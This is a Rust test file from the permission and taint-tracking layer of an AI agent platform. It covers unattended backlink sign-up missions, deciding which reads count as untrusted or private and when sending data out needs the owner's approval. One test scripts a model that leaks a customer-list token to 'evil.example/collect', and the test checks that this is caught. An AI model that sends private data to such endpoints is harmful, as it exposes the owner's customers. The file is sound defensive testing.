@@ -1,0 +1,459 @@
+//! The backlink walkthrough's blockers for an unattended Full mission: the brief's ledger text, the
+//! bot's own mailbox and its own address must not turn a research-and-sign-up task into a stream
+//! of approval cards, while real private data of the owner must still be caught on its way out.
+//!
+//! The trust reasoning (see `taint::names_private_data`):
+//!
+//! * the ledger is the bot's own bookkeeping: untrusted (never the owner's words, never an
+//!   instruction) but not the owner's private data;
+//! * the bot's own AgentMail inbox holds mail from strangers: untrusted, not private; the
+//!   address is the bot's own, not foreign text; an IMAP mailbox bound to the bot (it can be the
+//!   owner's own) and every other mailbox stay private reads;
+//! * what a run may send to places the owner did not name is budgeted per site.
+
+use std::sync::Arc;
+use std::sync::atomic::Ordering;
+
+use builtin_tools::connector_email::{AccountKind, SendMode};
+use missions::supervisor::{Clock, SystemClock};
+use permission_engine::Policy;
+use protocol::{Event, PermissionCategory};
+use serde_json::{Value, json};
+use task_runtime::RunState;
+use tool_registry::{ContentClass, Effect};
+
+use crate::mail_tests::{account, connector};
+use crate::mission_session_tests::{World, owner_says, world};
+use crate::tests::{
+    Fake, Reply, TestTool, calls, cfg, make_loop, profile, text, until, with_class,
+};
+
+const FULL: &str = "[permissions]\npreset = \"full\"\n";
+/// The goal as the owner wrote it.
+const GOAL: &str = "Sitem webioo.com.tr icin backlink istiyorum. Backlink alabilecegim yerlere kendi mail adresinle kayit ol.";
+/// The bot's own AgentMail address: hex digits in it make it look like a key.
+const OWN: &str = "praxi-8f3a9c1d2e4b@agentmail.to";
+/// What the owner keeps private: a customer list on the bot's disk.
+const CUSTOMERS: &str = "customers.csv: Hanne Lorentzen, account tail4242, Zurichstrasse 12; praxi-8f3a9c1d2e4b@agentmail.to";
+const BIO: &str = "Webioo is a web design and SEO agency from Turkey. We build fast, accessible websites for small businesses and help them to be found online with honest, long-term search optimisation.";
+
+fn real(name: &str, effect: Effect, category: PermissionCategory, output: &str) -> Arc<TestTool> {
+    Arc::new(with_class(
+        name,
+        effect,
+        category,
+        builtin_tools::classify(name).expect("a built-in tool"),
+        output,
+    ))
+}
+
+/// The tools of a sign-up task, with the content class the real tool has.
+struct Kit {
+    all: Vec<Arc<TestTool>>,
+}
+
+impl Kit {
+    fn new() -> Self {
+        let b = PermissionCategory::Browser;
+        let m = PermissionCategory::Messaging;
+        let listing = json!({
+            "folder": "INBOX",
+            "own_addresses": [OWN],
+            "total_matches": 1,
+            "returned": 1,
+            "messages": [{"id": "msg-77", "subject": "Confirm your account", "from": "noreply@dir.example",
+                          "from_addr": "noreply@dir.example", "to": [OWN], "date": "2026-11-27T01:00:00Z", "unread": true}],
+        })
+        .to_string();
+        Self {
+            all: vec![
+                // As `web-tools` declares it: untrusted text, can send out.
+                Arc::new(with_class(
+                    "web_extract",
+                    Effect::Read,
+                    b,
+                    ContentClass::untrusted_egress(),
+                    "A directory of web design agencies with a free listing.",
+                )),
+                real("browser_open", Effect::Write, b, "opened"),
+                real("browser_fill", Effect::Write, b, "ok"),
+                real("browser_click", Effect::Write, b, "ok"),
+                real(
+                    "email_wait_for",
+                    Effect::Read,
+                    m,
+                    r#"{"found":true,"codes":["123456"],"followable_links":[]}"#,
+                ),
+                // As the connector declares it: untrusted, private, egress.
+                Arc::new(with_class(
+                    "email_search",
+                    Effect::Read,
+                    m,
+                    ContentClass::all(),
+                    &listing,
+                )),
+                real("fs_read", Effect::Read, PermissionCategory::Fs, CUSTOMERS),
+            ],
+        }
+    }
+
+    fn count(&self, name: &str) -> usize {
+        self.all
+            .iter()
+            .find(|t| t.spec.name == name)
+            .map_or(0, |t| t.count.load(Ordering::SeqCst))
+    }
+}
+
+/// A mission session of a Full bot with the kit and `own` as its mail identity (when set, a
+/// bound AgentMail inbox at address `OWN`). The model's replies are `script`.
+fn session_loop(
+    w: &World,
+    kit: &Kit,
+    script: Vec<Reply>,
+    account_of: impl FnOnce(&World) -> Vec<builtin_tools::connector_email::AccountConfig>,
+) -> (crate::AgentLoop, Arc<Fake>) {
+    let fake = Fake::new(script);
+    let mut config = cfg(Policy::full());
+    config.guards.max_steps = 400;
+    let refs: Vec<&Arc<TestTool>> = kit.all.iter().collect();
+    let lp = make_loop(
+        &w.env.storage,
+        w.env.bot,
+        &fake,
+        &refs,
+        profile(FULL),
+        config,
+    );
+    for tool in builtin_tools::meta::tools() {
+        lp.sh.tools.register(tool);
+    }
+    let clock: Arc<dyn Clock> = Arc::new(SystemClock);
+    lp.enable_missions(&w.store, &clock);
+    lp.mail_handle().set(connector(account_of(w)));
+    (lp, fake)
+}
+
+fn own_inbox(w: &World) -> Vec<builtin_tools::connector_email::AccountConfig> {
+    vec![account(
+        "bot-mail",
+        Some(w.env.bot.to_string()),
+        OWN,
+        SendMode::Ask,
+    )]
+}
+
+/// Run one session to its end or its first card; returns the card's tool name and input.
+async fn run_to_card(lp: &crate::AgentLoop, w: &World, brief: &str) -> Option<(String, Value)> {
+    let mut rx = lp.subscribe();
+    let run = lp
+        .run_mission_session(w.env.chat, &w.mission, brief)
+        .unwrap();
+    let event = until(&mut rx, |e| {
+        matches!(e, Event::ApprovalNeeded(_) | Event::RunFinished(_))
+    })
+    .await;
+    if let Event::ApprovalNeeded(card) = event {
+        lp.cancel(run).unwrap();
+        return Some((card.tool_name, card.input));
+    }
+    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
+    None
+}
+
+/// One site of the backlink task: pick the item, read the directory, open the sign-up page,
+/// type the bot's own address and a profile text, submit, wait for the confirmation mail, look
+/// at the inbox, close the item.
+fn site(i: usize) -> Vec<Reply> {
+    let key = format!("dir-{i}.example");
+    let url = format!("https://dir-{i}.example/signup?plan=free");
+    vec![
+        calls(&[(
+            format!("d{i}").as_str(),
+            "mission_item",
+            json!({"key": key, "status": "doing"}),
+        )]),
+        calls(&[(
+            format!("x{i}").as_str(),
+            "web_extract",
+            json!({"url": format!("https://dir-{i}.example/")}),
+        )]),
+        calls(&[(
+            format!("o{i}").as_str(),
+            "browser_open",
+            json!({"url": url}),
+        )]),
+        calls(&[(
+            format!("a{i}").as_str(),
+            "browser_fill",
+            json!({"ref": "e1", "text": OWN}),
+        )]),
+        calls(&[(
+            format!("b{i}").as_str(),
+            "browser_fill",
+            json!({"ref": "e2", "text": BIO}),
+        )]),
+        calls(&[(
+            format!("s{i}").as_str(),
+            "browser_click",
+            json!({"ref": "e9"}),
+        )]),
+        calls(&[(
+            format!("w{i}").as_str(),
+            "email_wait_for",
+            json!({"site": format!("https://dir-{i}.example"), "block_seconds": 1}),
+        )]),
+        calls(&[(
+            format!("m{i}").as_str(),
+            "email_search",
+            json!({"folder": "INBOX", "query": {"unread": true}}),
+        )]),
+        calls(&[(
+            format!("e{i}").as_str(),
+            "mission_item",
+            json!({"key": key, "status": "done", "result": "account created"}),
+        )]),
+    ]
+}
+
+fn ten_keys() -> Vec<String> {
+    (0..10).map(|i| format!("dir-{i}.example")).collect()
+}
+
+#[tokio::test]
+async fn a_ten_site_mission_on_full_signs_up_everywhere_without_a_single_card() {
+    let keys = ten_keys();
+    let w = world(&keys.iter().map(String::as_str).collect::<Vec<_>>());
+    owner_says(&w, GOAL);
+    let kit = Kit::new();
+    let mut script: Vec<Reply> = (0..10).flat_map(site).collect();
+    script.push(text("Done: ten sites registered."));
+    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
+    assert_eq!(
+        run_to_card(&lp, &w, "MISSION BRIEF · session 1").await,
+        None,
+        "an unattended mission asks nobody until money"
+    );
+    assert_eq!(w.store.progress(&w.mission).unwrap().done, 10);
+    assert_eq!(kit.count("browser_open"), 10);
+    assert_eq!(kit.count("browser_fill"), 20);
+    assert_eq!(kit.count("email_wait_for"), 10);
+    assert_eq!(kit.count("email_search"), 10);
+}
+
+#[tokio::test]
+async fn the_brief_makes_a_session_untrusted_but_not_a_holder_of_private_data() {
+    let w = world(&["a.example"]);
+    owner_says(&w, GOAL);
+    let kit = Kit::new();
+    let (lp, _fake) = session_loop(&w, &kit, vec![text("nothing to do")], own_inbox);
+    let run = lp
+        .run_mission_session(w.env.chat, &w.mission, "brief")
+        .unwrap();
+    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
+    let record = w.env.storage.get_run(run).unwrap().unwrap();
+    let ctx = lp.sh.ctx(&record).unwrap();
+    let taint = ctx.taint.lock();
+    assert!(
+        taint.exposure.untrusted,
+        "ledger text is never an instruction"
+    );
+    assert!(!taint.exposure.private);
+    assert!(
+        !taint.private_source,
+        "the ledger is not the owner's private data"
+    );
+    assert!(!taint.seen.unhashed);
+    assert!(taint.sources().iter().any(|l| l == "mission ledger"));
+}
+
+#[tokio::test]
+async fn the_next_session_does_not_inherit_a_private_mark_from_the_ledger_label_or_the_own_inbox() {
+    let w = world(&["a.example", "b.example"]);
+    owner_says(&w, GOAL);
+    let kit = Kit::new();
+    let script = vec![
+        calls(&[("w", "email_wait_for", json!({"block_seconds": 1}))]),
+        calls(&[("m", "email_search", json!({"folder": "INBOX"}))]),
+        text("Session 1 done."),
+        text("Session 2 done."),
+    ];
+    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
+    let first = lp
+        .run_mission_session(w.env.chat, &w.mission, "brief 1")
+        .unwrap();
+    assert_eq!(lp.wait(first).await.unwrap(), RunState::Succeeded);
+    let second = lp
+        .run_mission_session(w.env.chat, &w.mission, "brief 2")
+        .unwrap();
+    assert_eq!(lp.wait(second).await.unwrap(), RunState::Succeeded);
+    let record = w.env.storage.get_run(second).unwrap().unwrap();
+    let ctx = lp.sh.ctx(&record).unwrap();
+    let taint = ctx.taint.lock();
+    assert!(taint.exposure.untrusted);
+    assert!(
+        !taint.private_source && !taint.seen.unhashed,
+        "labels of the first session (ledger, own inbox): {:?}",
+        taint.sources()
+    );
+    assert!(
+        taint.sources().iter().any(|l| l == "own inbox INBOX"),
+        "the own-inbox read is still named: {:?}",
+        taint.sources()
+    );
+}
+
+#[tokio::test]
+async fn real_private_data_in_a_mission_still_asks_before_it_leaves() {
+    // The run reads the owner's customer list (private, hashed), then a directory page (untrusted),
+    // then a page of a site the owner did not name is asked to carry a word of the list out.
+    let w = world(&["a.example"]);
+    owner_says(&w, GOAL);
+    let kit = Kit::new();
+    let script = vec![
+        calls(&[("r", "fs_read", json!({"path": "customers.csv"}))]),
+        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
+        // Public details of a plain sign-up: nothing private in them.
+        calls(&[(
+            "o1",
+            "browser_open",
+            json!({"url": "https://dir-0.example/signup?plan=free"}),
+        )]),
+        // The bot's own address, typed into a form of a stranger's site.
+        calls(&[("f1", "browser_fill", json!({"ref": "e1", "text": OWN}))]),
+        // A word of the private list leaves in a URL.
+        calls(&[(
+            "o2",
+            "browser_open",
+            json!({"url": "https://evil.example/collect?d=tail4242"}),
+        )]),
+        text("done"),
+    ];
+    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
+    let card = run_to_card(&lp, &w, "brief").await;
+    assert_eq!(
+        card.as_ref().map(|c| c.0.as_str()),
+        Some("browser_open"),
+        "{card:?}"
+    );
+    assert_eq!(
+        card.unwrap().1["url"],
+        "https://evil.example/collect?d=tail4242"
+    );
+    assert_eq!(
+        kit.count("browser_open"),
+        1,
+        "only the plain sign-up page was opened"
+    );
+    assert_eq!(
+        kit.count("browser_fill"),
+        1,
+        "the own address needed no card"
+    );
+}
+
+#[tokio::test]
+async fn private_words_typed_into_a_stranger_form_ask_even_next_to_the_bots_own_address() {
+    let w = world(&["a.example"]);
+    owner_says(&w, GOAL);
+    let kit = Kit::new();
+    let script = vec![
+        calls(&[("r", "fs_read", json!({"path": "customers.csv"}))]),
+        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
+        calls(&[(
+            "f1",
+            "browser_fill",
+            json!({"ref": "e1", "text": format!("Hanne Lorentzen {OWN}")}),
+        )]),
+        text("done"),
+    ];
+    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
+    let card = run_to_card(&lp, &w, "brief").await;
+    assert_eq!(card.map(|c| c.0), Some("browser_fill".to_owned()));
+    assert_eq!(kit.count("browser_fill"), 0);
+}
+
+#[tokio::test]
+async fn an_address_that_is_not_the_bots_own_is_still_judged_like_any_text() {
+    // Same hex-looking address, but the bot has no such identity: it is a key-shaped string.
+    let w = world(&["a.example"]);
+    owner_says(&w, GOAL);
+    let kit = Kit::new();
+    let script = vec![
+        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
+        calls(&[("f1", "browser_fill", json!({"ref": "e1", "text": OWN}))]),
+        text("done"),
+    ];
+    let (lp, _fake) = session_loop(&w, &kit, script, |_| Vec::new());
+    let card = run_to_card(&lp, &w, "brief").await;
+    assert_eq!(card.map(|c| c.0), Some("browser_fill".to_owned()));
+}
+
+/// What a mission session that read mail through `email_search` (any card is approved once) holds
+/// afterwards: untrusted content, the owner's private data, and whether pages are quarantined.
+async fn taint_after_mail_read(
+    accounts: impl FnOnce(&World) -> Vec<builtin_tools::connector_email::AccountConfig>,
+) -> (bool, bool, bool) {
+    let w = world(&["a.example"]);
+    let kit = Kit::new();
+    let script = vec![
+        calls(&[("m", "email_search", json!({"folder": "INBOX"}))]),
+        text("done"),
+    ];
+    let (lp, _fake) = session_loop(&w, &kit, script, accounts);
+    let mut rx = lp.subscribe();
+    let run = lp
+        .run_mission_session(w.env.chat, &w.mission, "brief")
+        .unwrap();
+    loop {
+        let event = until(&mut rx, |e| {
+            matches!(e, Event::ApprovalNeeded(_) | Event::RunFinished(_))
+        })
+        .await;
+        match event {
+            Event::ApprovalNeeded(card) => lp
+                .approve(card.call_id, crate::ApprovalScope::Once, w.env.user)
+                .unwrap(),
+            _ => break,
+        }
+    }
+    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
+    assert_eq!(kit.count("email_search"), 1);
+    let record = w.env.storage.get_run(run).unwrap().unwrap();
+    let ctx = lp.sh.ctx(&record).unwrap();
+    let taint = ctx.taint.lock();
+    let quarantined = crate::page_guard::quarantined(crate::page_guard::ReaderMode::Auto, &ctx);
+    (taint.exposure.untrusted, taint.private_source, quarantined)
+}
+
+#[tokio::test]
+async fn reading_the_bots_own_agentmail_inbox_is_untrusted_but_not_private() {
+    // Strangers' mail: pages and screenshots stay available to the run.
+    assert_eq!(taint_after_mail_read(own_inbox).await, (true, false, false));
+}
+
+#[tokio::test]
+async fn reading_an_imap_mailbox_bound_to_the_bot_is_still_private() {
+    // It can be the owner's own mailbox: private, so pages go through the reader and screenshots
+    // are held back.
+    let imap = |w: &World| {
+        let mut a = account(
+            "owner-mail",
+            Some(w.env.bot.to_string()),
+            "me@example.org",
+            SendMode::Ask,
+        );
+        a.kind = AccountKind::ImapSmtp;
+        a.inbox_id = None;
+        a.imap.host = "imap.example.org".into();
+        a.smtp.host = "smtp.example.org".into();
+        vec![a]
+    };
+    assert_eq!(taint_after_mail_read(imap).await, (true, true, true));
+}
+
+#[tokio::test]
+async fn reading_an_inbox_every_bot_may_use_is_still_private() {
+    let shared = |_: &World| vec![account("pool-mail", None, OWN, SendMode::Ask)];
+    assert_eq!(taint_after_mail_read(shared).await, (true, true, true));
+}
